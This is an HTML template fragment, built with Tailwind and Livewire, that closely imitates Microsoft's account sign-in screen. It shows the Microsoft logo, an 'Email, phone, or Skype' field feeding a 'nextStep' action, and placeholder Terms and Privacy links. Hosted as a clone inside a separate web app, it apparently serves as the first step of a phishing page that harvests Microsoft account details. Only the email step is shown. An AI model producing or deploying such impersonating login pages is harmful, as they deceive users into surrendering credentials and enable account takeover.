<div class="min-h-screen bg-gray-100 flex items-center justify-center">
    <div class="bg-white w-full max-w-md p-8 rounded shadow-md">
        <div class="flex justify-center mb-6">
            <img src="/images/microsoft-logo.png" alt="Microsoft" class="h-6">
        </div>
        <h2 class="text-2xl font-semibold mb-4 text-gray-800">Sign in</h2>

        <form wire:submit.prevent="nextStep">
            <label for="email" class="block text-sm font-medium text-gray-700 mb-1">Email, phone, or Skype</label>
            <input type="text" id="email" wire:model="email"
                   class="w-full border border-gray-300 rounded px-3 py-2 mb-4 focus:outline-none focus:ring-2 focus:ring-blue-600">

            <button type="submit"
                    class="w-full bg-blue-600 text-white py-2 rounded hover:bg-blue-700 transition">
                Next
            </button>
        </form>

        <div class="mt-6 text-sm text-blue-600 hover:underline cursor-pointer">
            No account? Create one!
        </div>

        <div class="mt-10 text-xs text-gray-500 flex justify-between">
            <a href="#" class="hover:underline">Terms of use</a>
            <a href="#" class="hover:underline">Privacy & cookies</a>
        </div>
    </div>
</div>
